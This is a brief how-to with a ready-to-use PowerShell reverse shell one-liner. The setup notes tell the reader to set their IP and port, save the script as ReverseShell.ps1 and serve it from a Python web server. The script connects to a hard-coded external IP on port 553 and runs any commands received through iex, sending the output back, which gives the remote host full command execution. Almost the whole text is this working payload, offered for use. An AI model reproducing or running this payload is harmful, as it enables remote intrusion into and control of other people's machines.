******

Change the IP to your host machines IP Address and the Port to what you're going to listen with

Create a file called ReverseShell.ps1 on your host machine under the directory you are going to use for the python server

COPY ONLY THE LINE OUTSIDE OF THE ASTERIKS

******

Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("159.65.164.219",553));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
